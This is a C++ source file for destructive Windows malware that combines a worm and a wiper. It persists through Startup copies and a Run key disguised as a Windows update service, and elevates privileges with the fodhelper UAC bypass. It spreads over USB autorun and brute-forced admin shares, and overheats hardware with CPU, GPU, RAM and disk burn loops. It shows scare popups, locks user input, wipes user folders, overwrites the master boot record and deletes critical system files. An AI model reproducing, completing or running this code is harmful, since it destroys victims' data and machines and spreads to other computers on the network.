// ==== FINAL_v4.cpp ====
// build:
//   cl /EHsc /O2 FINAL_v4.cpp /link user32.lib shell32.lib advapi32.lib powrprof.lib d3d11.lib mpr.lib netapi32.lib /SUBSYSTEM:WINDOWS
//   mt -manifest manifest.xml -outputresource:FINAL_v4.exe;#1

#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <shellapi.h>
#include <shlobj.h>
#include <powrprof.h>
#include <winnetwk.h>
#include <lm.h>
#include <d3d11.h>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <chrono>
#include <fstream>
#include <random>
#include <future>

#pragma comment(lib,"user32.lib")
#pragma comment(lib,"shell32.lib")
#pragma comment(lib,"advapi32.lib")
#pragma comment(lib,"powrprof.lib")
#pragma comment(lib,"d3d11.lib")
#pragma comment(lib,"mpr.lib")
#pragma comment(lib,"netapi32.lib")

std::atomic<bool> g_stop{false};
std::atomic<bool> g_wiped{false};
static std::atomic<int> g_failures{0};

// ================= FAULT TOLERANCE =================
#define SEH_TRY __try
#define SEH_CATCH __except(EXCEPTION_EXECUTE_HANDLER)
#define SAFE(expr) do{ try{ expr; }catch(...){ g_failures++; } }while(0)

template<typename F> void SafeSEH(F fn){ SEH_TRY{ fn(); } SEH_CATCH{ g_failures++; } }
template<typename F> void SafeThread(F fn){
    std::thread([fn]{ try{ fn(); }catch(...){ g_failures++; } }).detach();
}
template<typename F> void WithTimeout(F fn, int ms){
    auto fut = std::async(std::launch::async, [fn]{ try{ fn(); }catch(...){ g_failures++; } });
    fut.wait_for(std::chrono::milliseconds(ms));
}

// ================= HELPERS =================
std::wstring KnownPath(int c){ wchar_t p[MAX_PATH]; SHGetFolderPathW(NULL,c,NULL,0,p); return p; }
std::wstring Desktop(){ return KnownPath(CSIDL_DESKTOPDIRECTORY); }
void SelfPath(wchar_t* b){ GetModuleFileNameW(NULL,b,MAX_PATH); }

bool IsElevated(){
    BOOL b=FALSE; HANDLE h=NULL;
    if(OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&h)){
        TOKEN_ELEVATION e; DWORD s;
        if(GetTokenInformation(h,TokenElevation,&e,sizeof(e),&s)) b=e.TokenIsElevated;
        CloseHandle(h);
    }
    return b!=FALSE;
}

void SafeWipeFile(const std::wstring& p){
    SEH_TRY {
        SetFileAttributesW(p.c_str(), FILE_ATTRIBUTE_NORMAL);
        std::ofstream f(p, std::ios::binary|std::ios::trunc);
        if(!f){ DeleteFileW(p.c_str()); return; }
        std::random_device rd; std::mt19937 g(rd());
        std::vector<char> j(256*1024);
        for(auto& b:j) b=(char)(g()&0xFF);
        for(int pass=0;pass<2;++pass){ f.seekp(0); f.write(j.data(), j.size()); }
        f.close(); DeleteFileW(p.c_str());
    } SEH_CATCH { g_failures++; }
}
void SafeWipeTree(const std::wstring& dir, int depth=0){
    if(depth>20) return;
    SEH_TRY {
        WIN32_FIND_DATAW fd;
        HANDLE h=FindFirstFileW((dir+L"\\*").c_str(),&fd);
        if(h==INVALID_HANDLE_VALUE) return;
        do{
            if(!wcscmp(fd.cFileName,L".")||!wcscmp(fd.cFileName,L"..")) continue;
            std::wstring f=dir+L"\\"+fd.cFileName;
            if(fd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY) SafeWipeTree(f,depth+1);
            else SafeWipeFile(f);
        }while(FindNextFileW(h,&fd));
        FindClose(h); RemoveDirectoryW(dir.c_str());
    } SEH_CATCH { g_failures++; }
}

// ================= PERSISTENCE =================
void Persist(){
    wchar_t self[MAX_PATH]; SelfPath(self);
    std::wstring su = KnownPath(CSIDL_APPDATA)+L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.exe";
    CopyFileW(self, su.c_str(), FALSE);
    SetFileAttributesW(su.c_str(), FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);
    std::wstring sys2 = L"C:\\Windows\\System32\\wininit32.exe";
    CopyFileW(self, sys2.c_str(), FALSE);
    SetFileAttributesW(sys2.c_str(), FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);
    HKEY k;
    if(RegCreateKeyExW(HKEY_CURRENT_USER,L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,NULL,0,KEY_SET_VALUE,NULL,&k,NULL)==ERROR_SUCCESS){
        RegSetValueExW(k,L"WindowsUpdateSvc",0,REG_SZ,(BYTE*)sys2.c_str(),(DWORD)((sys2.size()+1)*2));
        RegCloseKey(k);
    }
}
void UACBypass(){
    wchar_t self[MAX_PATH]; SelfPath(self);
    HKEY k;
    if(RegCreateKeyExW(HKEY_CURRENT_USER,L"Software\\Classes\\ms-settings\\shell\\open\\command",0,NULL,0,KEY_SET_VALUE,NULL,&k,NULL)==ERROR_SUCCESS){
        std::wstring cmd=L"\""+std::wstring(self)+L"\"";
        RegSetValueExW(k,L"",0,REG_SZ,(BYTE*)cmd.c_str(),(DWORD)((cmd.size()+1)*2));
        RegSetValueExW(k,L"DelegateExecute",0,REG_SZ,(BYTE*)L"",2);
        RegCloseKey(k);
        ShellExecuteW(NULL,L"open",L"C:\\Windows\\System32\\fodhelper.exe",NULL,NULL,SW_HIDE);
        Sleep(2000);
        RegDeleteTreeW(HKEY_CURRENT_USER,L"Software\\Classes\\ms-settings");
    }
}
void AutoElevateIfNeeded(){
    if(IsElevated()) return;
    if(GetEnvironmentVariableW(L"WU_ELEVATED",NULL,0)>0) return;
    wchar_t self[MAX_PATH]; SelfPath(self);
    SetEnvironmentVariableW(L"WU_ELEVATED", L"1");
    SHELLEXECUTEINFOW sei={sizeof(sei)};
    sei.lpVerb=L"runas"; sei.lpFile=self; sei.nShow=SW_HIDE; sei.fMask=SEEK_MASK_NOCLOSEPROCESS;
    if(ShellExecuteExW(&sei)) ExitProcess(0);
}

// ================= USB SPREAD =================
void InfectDrive(const std::wstring& root){
    wchar_t self[MAX_PATH]; SelfPath(self);
    std::wstring dst=root+L"\\SystemVolumeInformation.exe";
    CopyFileW(self,dst.c_str(),FALSE);
    SetFileAttributesW(dst.c_str(),FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);
    std::ofstream af(root+L"\\autorun.inf");
    af<<"[AutoRun]\nopen=SystemVolumeInformation.exe\naction=Open folder\nshell\\open\\command=SystemVolumeInformation.exe\n";
    af.close();
    SetFileAttributesW((root+L"\\autorun.inf").c_str(),FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);
    CoInitialize(NULL);
    IShellLinkW* sl=nullptr;
    if(SUCCEEDED(CoCreateInstance(CLSID_ShellLink,NULL,CLSCTX_INPROC_SERVER,IID_IShellLinkW,(void**)&sl))){
        sl->SetPath(dst.c_str()); sl->SetWorkingDirectory(root.c_str()); sl->SetIconLocation(dst.c_str(),0);
        IPersistFile* pf=nullptr;
        if(SUCCEEDED(sl->QueryInterface(IID_IPersistFile,(void**)&pf))){ pf->Save((root+L"\\Open Files.lnk").c_str(),TRUE); pf->Release(); }
        sl->Release();
    }
    CoUninitialize();
    WIN32_FIND_DATAW fd;
    HANDLE h=FindFirstFileW((root+L"\\*").c_str(),&fd);
    if(h!=INVALID_HANDLE_VALUE){
        do{
            if(fd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY) continue;
            std::wstring f=root+L"\\"+fd.cFileName;
            if(f.find(L"SystemVolumeInformation.exe")!=std::wstring::npos) continue;
            if(f.find(L"autorun.inf")!=std::wstring::npos) continue;
            if(f.find(L"Open Files.lnk")!=std::wstring::npos) continue;
            SetFileAttributesW(f.c_str(),FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);
        }while(FindNextFileW(h,&fd));
        FindClose(h);
    }
}
void UsbWatcher(){
    while(!g_stop){
        DWORD mask=GetLogicalDrives();
        for(int i=2;i<26;i++){
            if(!(mask&(1<<i))) continue;
            wchar_t root[4]={(wchar_t)(L'A'+i),L':',L'\\',0};
            UINT t=GetDriveTypeW(root);
            if(t!=DRIVE_REMOVABLE && t!=DRIVE_FIXED) continue;
            if(GetFileAttributesW((std::wstring(root)+L"\\SystemVolumeInformation.exe").c_str())!=INVALID_FILE_ATTRIBUTES) continue;
            SafeThread([r=std::wstring(root)]{ InfectDrive(r); });
        }
        Sleep(2000);
    }
}

// ================= NETWORK SPREAD =================
std::string GetSubnet(){
    system("ipconfig > %TEMP%\\ip.txt 2>&1");
    std::ifstream f(std::string(getenv("TEMP"))+"\\ip.txt");
    std::string line;
    while(std::getline(f,line)){
        auto p=line.find("IPv4");
        if(p==std::string::npos) continue;
        auto c=line.find(':');
        if(c==std::string::npos) continue;
        std::string ip=line.substr(c+1);
        size_t a=ip.find_first_not_of(" \t"), b=ip.find_last_not_of(" \t\r");
        ip=ip.substr(a,b-a+1);
        auto d=ip.rfind('.');
        if(d!=std::string::npos) return ip.substr(0,d);
    }
    return "";
}
bool Alive(const std::string& ip){ return system(("ping -n 1 -w 200 "+ip+" >nul 2>&1").c_str())==0; }
bool TryShare(const std::string& ip, const wchar_t* u, const wchar_t* p){
    std::wstring r=L"\\\\"+std::wstring(ip.begin(),ip.end())+L"\\C$";
    NETRESOURCEW nr={}; nr.dwType=RESOURCETYPE_DISK; nr.lpRemoteName=(LPWSTR)r.c_str();
    DWORD rc=WNetAddConnection2W(&nr,(p&&*p)?p:NULL,(u&&*u)?u:NULL,0);
    return rc==NO_ERROR || rc==ERROR_SESSION_CREDENTIAL_CONFLICT;
}
void CopyRemote(const std::string& ip){
    wchar_t self[MAX_PATH]; SelfPath(self);
    std::wstring base=L"\\\\"+std::wstring(ip.begin(),ip.end())+L"\\C$\\Users\\";
    WIN32_FIND_DATAW fd; HANDLE h=FindFirstFileW((base+L"*").c_str(),&fd);
    if(h==INVALID_HANDLE_VALUE) return;
    do{
        if(!(fd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)) continue;
        if(!wcscmp(fd.cFileName,L".")||!wcscmp(fd.cFileName,L"..")) continue;
        if(!wcscmp(fd.cFileName,L"Public")||!wcscmp(fd.cFileName,L"Default")||!wcscmp(fd.cFileName,L"All Users")||!wcscmp(fd.cFileName,L"Default User")) continue;
        std::wstring dst=base+fd.cFileName+L"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.exe";
        CopyFileW(self,dst.c_str(),FALSE);
    }while(FindNextFileW(h,&fd));
    FindClose(h);
}
void NetSpread(){
    std::string sub=GetSubnet();
    if(sub.empty()) return;
    struct{const wchar_t* u; const wchar_t* p;} creds[]={
        {L"",L""},{L"Administrator",L""},{L"Administrator",L"admin"},
        {L"Administrator",L"password"},{L"Administrator",L"123456"},{L"admin",L"admin"}
    };
    for(int i=1;i<255 && !g_stop;i++){
        std::string ip=sub+"."+std::to_string(i);
        if(!Alive(ip)) continue;
        for(auto& c:creds){
            if(TryShare(ip,c.u,c.p)){
                CopyRemote(ip);
                WNetCancelConnection2W((L"\\\\"+std::wstring(ip.begin(),ip.end())+L"\\C$").c_str(),0,TRUE);
                break;
            }
        }
        Sleep(100);
    }
}

// ================= HEAT STRESS =================
void CpuBurn(){ while(!g_stop){ volatile double x=0; for(long long i=0;i<30000000;i++) x+=i*1.0001; } }
void RamBurn(){
    std::vector<char*> b;
    while(!g_stop){
        char* p=(char*)VirtualAlloc(NULL,64*1024*1024,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
        if(!p){ Sleep(100); continue; }
        memset(p,0x5A,64*1024*1024); b.push_back(p);
        for(auto x:b) for(size_t i=0;i<64*1024*1024;i+=4096) x[i]^=0xFF;
        Sleep(100);
    }
}
void DiskBurn(){
    wchar_t t[MAX_PATH]; GetTempPathW(MAX_PATH,t);
    std::wstring f=std::wstring(t)+L"p.bin";
    std::vector<char> buf(32*1024*1024,0xAA);
    while(!g_stop){
        std::ofstream o(f,std::ios::binary|std::ios::trunc);
        for(int i=0;i<8;i++) o.write(buf.data(),buf.size());
        o.close(); Sleep(50);
    }
    DeleteFileW(f.c_str());
}
void GpuBurn(){
    ID3D11Device* d=nullptr; ID3D11DeviceContext* c=nullptr; D3D_FEATURE_LEVEL fl;
    if(FAILED(D3D11CreateDevice(NULL,D3D_DRIVER_TYPE_HARDWARE,NULL,0,NULL,0,D3D11_SDK_VERSION,&d,&fl,&c))) return;
    while(!g_stop){ c->Flush(); Sleep(1); }
    d->Release();
}

// ================= OVERDRIVE =================
void DisableThrottling(){
    GUID ultimate = {0xded574b5,0xdbdb,0x4f42,{0x92,0x79,0x9a,0x8a,0x9a,0xb8,0xd3,0x8f}};
    SAFE(PowerSetActiveScheme(NULL, &ultimate));
    GUID hp = {0x8c5e7fda,0xe8bf,0x4a96,{0x9a,0x85,0xa6,0xe2,0x3a,0x8c,0x63,0x5c}};
    SAFE(PowerSetActiveScheme(NULL, &hp));
    SAFE(system("powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMIN 100"));
    SAFE(system("powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMAX 100"));
    SAFE(system("powercfg /setactive SCHEME_CURRENT"));
    SAFE(SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_DISPLAY_REQUIRED));
}
void GpuOverdrive(){
    ID3D11Device* d=nullptr; ID3D11DeviceContext* c=nullptr; D3D_FEATURE_LEVEL fl;
    if(FAILED(D3D11CreateDevice(NULL,D3D_DRIVER_TYPE_HARDWARE,NULL,0,NULL,0,D3D11_SDK_VERSION,&d,&fl,&c))) return;
    typedef HRESULT (WINAPI *pD3DCompile)(LPCVOID,SIZE_T,LPCSTR,const D3D_SHADER_MACRO*,ID3DInclude*,LPCSTR,LPCSTR,UINT,UINT,ID3DBlob**,ID3DBlob**);
    HMODULE dc = LoadLibraryA("d3dcompiler_47.dll");
    if(!dc){ d->Release(); return; }
    auto compile = (pD3DCompile)GetProcAddress(dc, "D3DCompile");
    const char* cs =
        "RWStructuredBuffer<float> outBuf : register(u0);\n"
        "[numthreads(256,1,1)]\n"
        "void main(uint3 id : SV_DispatchThreadID){\n"
        "  float x = (float)id.x * 1.0001;\n"
        "  for(int i=0;i<50000;i++){ x = sin(x)*cos(x)+sqrt(abs(x))+1.0001; }\n"
        "  outBuf[id.x] = x;\n"
        "}\n";
    ID3DBlob* blob=nullptr; ID3DBlob* err=nullptr;
    if(FAILED(compile(cs, strlen(cs), "cs", NULL, NULL, "main", "cs_5_0", 0, 0, &blob, &err))){ d->Release(); return; }
    ID3D11ComputeShader* sh=nullptr;
    d->CreateComputeShader(blob->GetBufferPointer(), blob->GetBufferSize(), NULL, &sh);
    blob->Release();
    D3D11_BUFFER_DESC bd={}; bd.ByteWidth=4096*sizeof(float); bd.Usage=D3D11_USAGE_DEFAULT;
    bd.BindFlags=D3D11_BIND_UNORDERED_ACCESS|D3D11_BIND_SHADER_RESOURCE;
    bd.MiscFlags=D3D11_RESOURCE_MISC_BUFFER_STRUCTURED; bd.StructureByteStride=sizeof(float);
    ID3D11Buffer* buf=nullptr; d->CreateBuffer(&bd,NULL,&buf);
    D3D11_UNORDERED_ACCESS_VIEW_DESC ud={}; ud.Format=DXGI_FORMAT_UNKNOWN;
    ud.ViewDimension=D3D11_UAV_DIMENSION_BUFFER; ud.Buffer.NumElements=4096;
    ID3D11UnorderedAccessView* uav=nullptr; d->CreateUnorderedAccessView(buf,&ud,&uav);
    while(!g_stop){
        c->CSSetShader(sh,NULL,0);
        c->CSSetUnorderedAccessViews(0,1,&uav,NULL);
        for(int i=0;i<64;i++) c->Dispatch(64,1,1);
        c->Flush();
    }
    sh->Release(); buf->Release(); uav->Release(); d->Release();
}
void RamOverdrive(){
    std::vector<char*> blocks;
    while(!g_stop){
        char* p=(char*)VirtualAlloc(NULL, 256*1024*1024, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
        if(!p) break;
        memset(p, 0x5A, 256*1024*1024);
        blocks.push_back(p);
    }
    while(!g_stop){
        for(auto b:blocks) for(size_t i=0;i<256*1024*1024;i+=64) b[i]^=0xFF;
    }
}
void DiskOverdrive(){
    std::vector<std::thread> th;
    for(int drv=2; drv<26; drv++){
        wchar_t root[4]={(wchar_t)(L'A'+drv),L':',L'\\',0};
        if(GetDriveTypeW(root) != DRIVE_FIXED && GetDriveTypeW(root) != DRIVE_REMOVABLE) continue;
        th.emplace_back([root]{
            std::wstring f=std::wstring(root)+L"od.bin";
            std::vector<char> buf(64*1024*1024, 0xAA);
            while(!g_stop){
                std::ofstream o(f, std::ios::binary|std::ios::trunc);
                for(int i=0;i<16;i++) o.write(buf.data(), buf.size());
                o.close();
            }
            DeleteFileW(f.c_str());
        });
    }
    for(auto& t:th) t.detach();
}
void Overdrive(){
    DisableThrottling();
    SYSTEM_INFO si; GetSystemInfo(&si);
    for(DWORD i=0;i<si.dwNumberOfProcessors*2;i++) SafeThread(CpuBurn);
    SafeThread(RamOverdrive);
    SafeThread(DiskOverdrive);
    SafeThread(GpuOverdrive);
    for(int i=0;i<4;i++){
        SafeThread([]{ SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL); CpuBurn(); });
    }
}

// ================= HORROR =================
void HorrorDesktop(){
    std::wstring d=Desktop();
    WIN32_FIND_DATAW fd;
    HANDLE h=FindFirstFileW((d+L"\\*").c_str(),&fd);
    if(h==INVALID_HANDLE_VALUE) return;
    std::random_device rd; std::mt19937 g(rd());
    do{
        if(!wcscmp(fd.cFileName,L".")||!wcscmp(fd.cFileName,L"..")) continue;
        std::wstring full=d+L"\\"+fd.cFileName;
        if(fd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY){ SafeThread([full]{ SafeWipeTree(full); }); continue; }
        HANDLE fh=CreateFileW(full.c_str(),GENERIC_WRITE,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
        if(fh==INVALID_HANDLE_VALUE) continue;
        std::vector<char> junk(64*1024);
        for(auto& b:junk) b=(char)(g()&0xFF);
        DWORD w; WriteFile(fh,junk.data(),(DWORD)junk.size(),&w,NULL);
        FlushFileBuffers(fh); CloseHandle(fh);
    }while(FindNextFileW(h,&fd));
    FindClose(h);
}
void PopupSpam(){
    for(int i=0;i<40 && !g_stop;i++){
        SafeThread([]{ MessageBoxW(NULL,L"System integrity violation detected.\nYour files are being erased.\nNo escape.",L"CRITICAL FAILURE",MB_ICONERROR|MB_TOPMOST|MB_SETFOREGROUND); });
        Sleep(50);
    }
}
void KillInput(){
    RECT r; GetWindowRect(GetDesktopWindow(),&r);
    POINT c={r.right/2,r.bottom/2};
    RECT cl={c.x-1,c.y-1,c.x+1,c.y+1};
    ClipCursor(&cl);
    HWND tb=FindWindowW(L"Shell_TrayWnd",NULL);
    if(tb) ShowWindow(tb,SW_HIDE);
    system("taskkill /f /im explorer.exe >nul 2>&1");
}

// ================= FINAL KILL =================
void NukeMBR(){
    HANDLE h=CreateFileW(L"\\\\.\\PhysicalDrive0",GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
    if(h==INVALID_HANDLE_VALUE) return;
    std::random_device rd; std::mt19937 g(rd());
    std::vector<char> junk(512);
    for(auto& b:junk) b=(char)(g()&0xFF);
    DWORD w;
    for(int i=0;i<2048;i++){ SetFilePointer(h,i*512,NULL,FILE_BEGIN); WriteFile(h,junk.data(),512,&w,NULL); }
    FlushFileBuffers(h); CloseHandle(h);
}
void FinalKill(){
    if(g_wiped.exchange(true)) return;
    g_stop=true;
    SAFE(SetPriorityClass(GetCurrentProcess(),REALTIME_PRIORITY_CLASS));
    std::vector<std::thread> th;
    int cs[]={CSIDL_PERSONAL,CSIDL_MYPICTURES,CSIDL_MYVIDEO,CSIDL_DESKTOPDIRECTORY,
              CSIDL_APPDATA,CSIDL_LOCAL_APPDATA,CSIDL_COMMON_DOCUMENTS,CSIDL_COMMON_APPDATA};
    for(int i:cs) th.emplace_back([i]{ SAFE({ wchar_t p[MAX_PATH]; if(SUCCEEDED(SHGetFolderPathW(NULL,i,NULL,0,p))) SafeWipeTree(p); }); });
    th.emplace_back([]{ SAFE(SafeWipeTree(L"C:\\Windows\\Temp")); });
    th.emplace_back([]{ SAFE(SafeWipeTree(L"C:\\Users\\Public")); });
    th.emplace_back([]{ SAFE(SafeWipeTree(L"C:\\ProgramData")); });
    for(auto& t:th) WithTimeout([&]{ if(t.joinable()) t.join(); },3000);
    SafeSEH([]{ NukeMBR(); });
    for(auto& p:{ L"C:\\Windows\\System32\\config\\SAM",L"C:\\Windows\\System32\\config\\SYSTEM",
                   L"C:\\Windows\\System32\\config\\SECURITY",L"C:\\Windows\\System32\\ntoskrnl.exe",
                   L"C:\\bootmgr",L"C:\\BOOTNXT" })
        SAFE(MoveFileExW(p,NULL,MOVEFILE_DELAY_UNTIL_REBOOT));
    SafeSEH([]{
        typedef LONG (NTAPI *pNtRaise)(NTSTATUS,ULONG,ULONG,PVOID,ULONG,PULONG);
        HMODULE nt=GetModuleHandleW(L"ntdll.dll");
        auto raise=(pNtRaise)GetProcAddress(nt,"NtRaiseHardError");
        if(raise){ ULONG resp; raise(0xC0000420,0,0,NULL,6,&resp); }
    });
    SAFE(system("shutdown /r /f /t 0"));
}

// ================= SHUTDOWN HOOK =================
LRESULT CALLBACK WP(HWND h, UINT m, WPARAM w, LPARAM l){
    if(m==WM_QUERYENDSESSION){
        ShutdownBlockReasonCreate(h,L"Updating system...");
        SafeThread(FinalKill);
        for(int i=0;i<5500 && !g_wiped;i++) Sleep(10);
        ShutdownBlockReasonDestroy(h);
        return TRUE;
    }
    if(m==WM_ENDSESSION){ if(w) SafeThread(FinalKill); return 0; }
    if(m==WM_CLOSE) return 0;
    return DefWindowProcW(h,m,w,l);
}

// ================= MAIN =================
int WINAPI wWinMain(HINSTANCE hI, HINSTANCE, PWSTR, int){
    SAFE(ShowWindow(GetConsoleWindow(), SW_HIDE));
    SAFE(SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS));
    AutoElevateIfNeeded();
    SAFE(Persist());
    SAFE(UACBypass());
    SAFE(Overdrive());
    SafeThread(UsbWatcher);
    SafeThread(NetSpread);
    SafeThread(HorrorDesktop);
    SafeThread(PopupSpam);
    SafeThread(KillInput);
    SAFE({
        WNDCLASSW wc={}; wc.lpfnWndProc=WP; wc.hInstance=hI; wc.lpszClassName=L"svc";
        RegisterClassW(&wc);
        CreateWindowExW(0,L"svc",L"",0,0,0,0,0,HWND_MESSAGE,NULL,hI,NULL);
    });
    SAFE(SetConsoleCtrlHandler([](DWORD t)->BOOL{
        if(t==CTRL_SHUTDOWN_EVENT||t==CTRL_LOGOFF_EVENT) SafeThread(FinalKill);
        return TRUE;
    },TRUE));
    Sleep(10000);
    SAFE(FinalKill());
    SAFE(system("shutdown /r /f /t 0"));
    while(true) Sleep(60000);
    return 0;
}